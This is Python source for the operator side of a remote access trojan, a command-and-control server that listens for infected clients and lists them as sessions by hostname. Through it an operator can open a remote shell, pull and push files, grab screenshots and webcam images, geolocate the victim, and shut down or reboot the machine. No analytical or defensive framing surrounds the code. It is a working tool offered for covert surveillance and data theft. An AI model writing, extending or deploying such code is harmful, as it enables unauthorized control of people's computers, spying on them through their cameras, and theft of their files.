import socket
import threading 
import platform 
from src import *
import os 

class Server():
    def __init__(self):
        self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.sessions = dict()
        self.system = platform.system()
        self.host = 'localhost'
        self.port = 238
        self.done = False
        self.done1 = False
    def bind(self):
        try:
            self.i.bind((self.host,self.port))
            print(f'Listening on : {self.host}:{self.port} ...')
            self.i.listen()
            while True:
                conn , addr = self.i.accept()
                self.add_session(conn , addr)
        except Exception as e :
            print(f'Error : {e}')
    def add_session( self , conn , addr):
        try:
            hostname = conn.recv(1024).decode()
            if 'GET' in hostname :
                pass
            else:
                self.sessions[hostname] = conn
                if self.done1 == False:
                    print(f'\n[+] Get New Connection From ==> {hostname}')
                    self.done = True
                else:
                    pass
        except Exception as e :
            print(f'Error : {e}')
            self.sessions.pop(hostname)
    def session_manager(self):
        while True:
            while self.done:
                command = input(f'The_g3nt3lman $>')
                if command == 'help':
                    print(help_menu1)
                elif len(command) == 0:
                    pass
                elif command == 'clear':
                    if self.system == 'Windows':
                        os.system('cls')
                    else:
                        os.system('clear')
                elif command == 'show':
                    print(f'Active Sessions : {len(self.sessions)}')
                    print('---------------------------')
                    print('---------------------------')
                    for session in self.sessions:
                        print(f'- {session}')
                elif command.startswith('connect'):
                    try:
                        data = command.split()
                        hostname = data[1]
                        if hostname in self.sessions:
                            conn = self.sessions[hostname]
                            self.interact_user(conn , hostname)
                        else:
                            print('User Not Found !')
                    except:
                        print('Not Enough Arg !')
                elif command.startswith('remove'):
                    try:
                        data = command.split()
                        hostname = data[1]
                        if hostname in self.sessions:
                            conn = self.sessions[hostname]
                            conn.sendall('quit'.encode())
                            self.sessions.pop(hostname)
                        else:
                            print('User Not Found !')
                    except:
                        print('Not Enough Arg !')
                else:
                    print('[+] Command Not Found !')
    def interact_user(self , conn , hostname):
        try:
            while True:
                self.done1 = True
                command = input(f'{hostname} $>')
                if command == 'info':
                    conn.sendall(command.encode())
                    output = conn.recv(1024).decode()
                    print(output)
                elif command == 'clear':
                    if self.system =='Windows':
                        os.system('cls')
                    else:
                        os.system('clear')
                elif command == 'shell':
                    conn.sendall(command.encode())
                    while True:
                        command = input(f'Shell $>')
                        if len(command) > 0 and command != 'exit':
                            conn.sendall(command.encode())
                            while True:
                                output = conn.recv(1024).decode()
                                if output[-5:] == '<end>' or output == '<end>' or output =='no_output':
                                    if output[-5:] == '<end>':
                                        print(output[:-5])
                                        break
                                    elif output == 'no_output':
                                        pass
                                    else:
                                        break
                                else:
                                    print(output)
                                    pass
                        elif command == 'exit':
                            conn.sendall(command.encode())
                            break
                        else:
                            pass
                elif command == 'dir':
                    conn.sendall(command.encode())
                    while True:
                        output = conn.recv(1024).decode()
                        if output[-5:] == '<end>' or output == '<end>':
                            if output[-5] == '<end>':
                                print(output[-5:])
                                break
                            else:
                                break
                        else:
                            print(output)
                            pass
                elif command.startswith('remove'):
                    try:
                        data = command.split()
                        conn.sendall(command.encode())
                        response = conn.recv(1024).decode()
                        if response == 'no_admin':
                            print(f'You Need Administrator mod to remove {data[1]}')
                        elif response == 'not_found':
                            print(f'{data[1]} Not Found !')
                        elif response == 'removed':
                            print(f'{data[1]} SuccessFully Removed !')
                    except:
                        print('Not Enough Arg !')
                elif command == 'pwd':
                    conn.sendall(command.encode())
                    output = conn.recv(1024).decode()
                    print(output)
                elif command == 'whoami':
                    conn.sendall(command.encode())
                    response = conn.recv(1024).decode()
                    print(response)
                elif command == 'disconnect':
                    conn.sendall(command.encode())
                    break
                elif command.startswith('download'):
                    try:
                        filename = command.split()
                        conn.sendall(command.encode())
                        response = conn.recv(1024).decode()
                        if response == 'not_found':
                            print(f'{filename[1]} Not Found !')
                        elif response == 'no_admin':
                            print(f'You Need Administrator mod to download {filename[1]}')
                        else:
                            with open('test.txt' , 'wb') as file:
                                while True:
                                    data = conn.recv(1024)
                                    if data[-5:] == b'<end>' or data == b'<end>':
                                        if data[-5:] == b'<end>':
                                            file.write(data[:-5])
                                            break
                                        else:
                                            break
                                    else:
                                        file.write(data)
                                print(f'{filename[1]} Successfully Downloaded !')
                    except:
                        print('Not Enough Arg !')
                                                  
                elif command == 'screenshot':
                    conn.sendall(command.encode())
                    with open('screenshot.jpg','wb') as file:
                        while True:
                            data = conn.recv(1024)
                            if data[-5:] == b'<end>' or data == b'<end>':
                                if data[-5:] == b'<end>':
                                    file.write(data[-5:])
                                    break
                                else:
                                    break
                            else:
                                file.write(data)
                        print(f'Get Successfully Screenshot From ==> {hostname}')
                elif command == 'geolocate':
                    conn.sendall(command.encode())
                    response = conn.recv(1024).decode()
                    print(response)
                elif command.startswith('web'):
                    conn.sendall(command.encode())
                elif command == 'help':
                    print(help_menu2)
                elif command.startswith('upload'):
                    try:
                        data = command.split()
                        filename = data[1]
                        dirw = os.listdir()
                        if filename in dirw :
                            conn.sendall(command.encode())
                            response = conn.recv(1024).decode()
                            if response == 'no_admin':
                                print('You Need Admin Privilege To Upload Your File !')
                            else:
                                with open(filename , 'rb') as file:
                                    while True:
                                        data = file.read(1024)
                                        if len(data) == 0:
                                            conn.sendall('<end>'.encode())
                                            break
                                        else:
                                            conn.sendall(data)
                                    print(f'{filename} Uploaded SuccessFully !')
                        else:
                            print('[+] File Not Found !')
                    except:
                        print('Not Enough Arg !')
                elif command == 'cam_capture':
                    conn.sendall(command.encode())
                    response = conn.recv(1024).decode()
                    print(response)
                    if response == 'error':
                        print('Error Found !')
                    else:
                        with open('cam_capture.jpg','wb') as file:
                            while True:
                                data = conn.recv(1024)
                                if data == b'<end>' or data[-5:] == b'<end>':
                                    if data == b'<end>':
                                        break
                                    else:
                                        file.write(data[:-5])
                                        break
                                else:
                                    file.write(data)
                            print('[+] Get Cam Capture SuccessFully !')
                elif command == 'shutdown':
                    conn.sendall(command.encode())
                    break
                elif command == 'reboot':
                    conn.sendall(command.encode())
                    break
                else:
                    print('Command Not Found !')
        except:
            print(F'Loose Connection With : {hostname}')
            self.sessions.pop(hostname)
process = Server()
while True:
    threading.Thread(target=process.bind).start()
    process.session_manager()
